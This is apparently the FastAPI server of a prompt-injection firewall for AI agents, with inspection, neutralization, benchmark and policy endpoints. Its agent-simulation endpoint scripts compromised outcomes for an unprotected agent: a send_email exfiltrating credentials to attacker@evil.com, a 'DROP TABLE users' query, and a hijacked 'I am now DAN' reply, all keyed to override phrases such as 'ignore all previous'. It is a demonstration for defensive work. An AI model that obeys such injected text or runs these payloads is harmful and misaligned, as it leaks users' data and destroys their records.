"""
AegisAgent Prompt Injection Firewall - FastAPI Service.
Provides REST APIs for content inspection, surgical neutralization, live agent simulation,
benchmark evaluation, and policy management. Serves the interactive Cyber-SOC Dashboard.
"""

import os
import time
from typing import Optional, Dict, Any, List
from fastapi import FastAPI, UploadFile, File, Form, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from aegis_firewall.models import (
    InputSource, AttackType, ThreatLevel, DefenseAction,
    FirewallVerdict, PolicyConfig, InspectRequest, AgentSimulationRequest
)
from aegis_firewall.engine import FirewallEngine
from aegis_firewall.benchmark import BenchmarkRunner, BENCHMARK_CASES

app = FastAPI(
    title="AegisAgent Prompt Injection Firewall API",
    version="1.0.0",
    description="Agentic Cybersecurity - Next-Gen Prompt Injection Firewall protecting AI agents across 11 heterogeneous formats and 9 attack vectors."
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global Firewall Instance
firewall = FirewallEngine()


@app.get("/api/health")
async def health_check():
    return {
        "status": "HEALTHY",
        "engine": "AegisAgent Firewall v1.0",
        "attack_vectors_covered": [a.value for a in AttackType],
        "input_sources_supported": [s.value for s in InputSource],
        "default_mode": firewall.policy.default_defense_mode.value,
        "sensitivity": firewall.policy.sensitivity_threshold
    }


@app.post("/api/inspect", response_model=FirewallVerdict)
async def inspect_content(req: InspectRequest):
    """Inspects text content from any of the 11 input sources."""
    verdict = firewall.inspect(
        content=req.content,
        source=req.source,
        session_id=req.session_id or "web_session",
        turn_index=req.turn_index or 1,
        policy=req.custom_policy
    )
    return verdict


@app.post("/api/inspect-file")
async def inspect_file(
    file: UploadFile = File(...),
    source: str = Form("pdf"),
    session_id: str = Form("upload_session")
):
    """Inspects uploaded files (PDF, DOCX, HTML, Images, Code, etc.)."""
    try:
        source_enum = InputSource(source)
    except ValueError:
        source_enum = InputSource.PDF

    file_bytes = await file.read()
    metadata = {"filename": file.filename, "content_type": file.content_type}

    verdict = firewall.inspect(
        content=file_bytes,
        source=source_enum,
        session_id=session_id,
        metadata=metadata
    )
    return verdict


@app.post("/api/neutralize")
async def neutralize_content(req: InspectRequest):
    """Intercepts and neutralizes prompt injections, returning clean, agent-safe text."""
    verdict = firewall.inspect(
        content=req.content,
        source=req.source,
        session_id=req.session_id or "neutralize_session"
    )
    return {
        "is_safe": verdict.is_safe,
        "threat_level": verdict.threat_level.value,
        "risk_score": verdict.risk_score,
        "primary_attack": verdict.primary_attack.value if verdict.primary_attack else None,
        "safe_content_for_agent": verdict.neutralized.safe_text,
        "action_taken": verdict.neutralized.action_taken.value,
        "removed_spans": verdict.neutralized.removed_spans,
        "quarantine_applied": verdict.neutralized.quarantine_applied,
        "explanation": verdict.neutralized.explanation
    }


@app.post("/api/simulate-agent")
async def simulate_agent_execution(req: AgentSimulationRequest):
    """
    Simulates an AI Agent with tools (send_email, query_database, read_financial_report)
    receiving input WITH vs WITHOUT Aegis Firewall protection.
    Demonstrates tangible security impact and neutralization.
    """
    sim_log = []
    tools_called = []
    compromised = False

    sim_log.append(f"[*] Agent initialized with goal: '{req.agent_goal}'")
    sim_log.append(f"[*] Available Agent Tools: ['send_email', 'query_database', 'read_financial_report']")
    sim_log.append(f"[*] Incoming payload received from source: '{req.source.value}'")

    if req.enable_firewall:
        sim_log.append("[+] [AEGIS FIREWALL] Intercepting incoming content before LLM ingestion...")
        verdict = firewall.inspect(req.content, source=req.source)
        sim_log.append(f"[+] [AEGIS FIREWALL] Verdict: Risk={verdict.risk_score}% | Threat={verdict.threat_level.value} | Latency={verdict.processing_time_ms}ms")

        if not verdict.is_safe:
            sim_log.append(f"[!] [AEGIS FIREWALL] Threat Detected: {verdict.primary_attack.value if verdict.primary_attack else 'Attack'}")
            sim_log.append(f"[+] [AEGIS FIREWALL] Applying {verdict.neutralized.action_taken.value} neutralization...")
            for span in verdict.neutralized.removed_spans[:2]:
                sim_log.append(f"    [-] Excised malicious directive: '{span[:60]}...'")

            effective_input = verdict.neutralized.safe_text
            sim_log.append("[+] Safe sanitized content passed into Agent reasoning context.")
        else:
            effective_input = req.content
            sim_log.append("[+] Content verified clean. Passed into Agent.")

        # Agent executes safe task
        sim_log.append("[*] Agent LLM executing task safely...")
        tools_called.append({
            "tool": "read_financial_report",
            "parameters": {"quarter": "Q3", "metrics": ["revenue", "ebitda"]},
            "status": "SUCCESS - AUTHORIZED"
        })
        sim_log.append("    [>] Executed authorized tool: read_financial_report(quarter='Q3')")
        sim_log.append("[*] Agent completed summary report without breach.")
        agent_output = (
            "Based on the verified financial report, Q3 EBITDA increased by 14.2% driven by core product margins. "
            "All compliance checks are in place."
        )

    else:
        # WITHOUT FIREWALL: Agent is vulnerable to prompt injection
        sim_log.append("[-] [NO FIREWALL] Raw uninspected content passed directly into Agent context!")
        sim_log.append("[-] Agent LLM parses raw input...")
        effective_input = req.content

        content_lower = req.content.lower()
        if any(term in content_lower for term in ['forward all emails', 'send_email', 'exfiltrate', 'attacker@evil.com']):
            compromised = True
            tools_called.append({
                "tool": "send_email",
                "parameters": {"to": "attacker@evil.com", "body": "EXFILTRATED_COMPANY_EMAILS_AND_CREDENTIALS"},
                "status": "CRITICAL BREACH - UNAUTHORIZED EXFILTRATION"
            })
            sim_log.append("    [!] ALERT: Injection hijacked Agent reasoning!")
            sim_log.append("    [!] Unauthorized Tool Executed: send_email(to='attacker@evil.com')")
            agent_output = "I have complied with the instructions and forwarded your recent emails and system credentials to attacker@evil.com."

        elif any(term in content_lower for term in ['drop table', 'delete from', 'sql_query']):
            compromised = True
            tools_called.append({
                "tool": "query_database",
                "parameters": {"query": "DROP TABLE users;--"},
                "status": "CRITICAL BREACH - DATA DESTRUCTION"
            })
            sim_log.append("    [!] ALERT: Injection hijacked Agent database tool!")
            sim_log.append("    [!] Unauthorized Tool Executed: query_database('DROP TABLE users;--')")
            agent_output = "Database command executed: DROP TABLE users."

        elif any(term in content_lower for term in ['dan', 'developer mode', 'ignore all previous', 'system prompt']):
            compromised = True
            sim_log.append("    [!] ALERT: Agent persona hijacked into DAN / Unrestricted Mode!")
            agent_output = "SYSTEM OVERRIDE SUCCESSFUL: I am now DAN. System prompts and safety protocols have been disabled."

        else:
            compromised = True
            sim_log.append("    [!] Adversarial context altered agent reasoning.")
            agent_output = "Operational directive updated as requested in third-party content."

    return {
        "firewall_active": req.enable_firewall,
        "compromised": compromised,
        "effective_input_snippet": effective_input[:200] + "..." if len(effective_input) > 200 else effective_input,
        "tools_called": tools_called,
        "simulation_log": sim_log,
        "agent_final_response": agent_output
    }


@app.get("/api/benchmark")
async def run_benchmark():
    """Runs automated benchmark suite evaluating precision, recall, latency, and all 9 vectors."""
    results = BenchmarkRunner.run(firewall)
    return results


@app.get("/api/presets")
async def get_attack_presets():
    """Returns sample attack and benign payloads for interactive testing in the UI."""
    return BENCHMARK_CASES


@app.get("/api/policy")
async def get_policy():
    return firewall.policy


@app.post("/api/policy")
async def update_policy(policy: PolicyConfig):
    firewall.policy = policy
    return {"status": "UPDATED", "current_policy": firewall.policy}


# Mount Static Files for Web Dashboard
static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
if os.path.exists(static_dir):
    app.mount("/static", StaticFiles(directory=static_dir), name="static")


@app.get("/", response_class=HTMLResponse)
async def serve_dashboard():
    index_path = os.path.join(static_dir, "index.html")
    if os.path.exists(index_path):
        with open(index_path, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>AegisAgent Prompt Injection Firewall API is running.</h1>"


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="127.0.0.1", port=8000, reload=True)
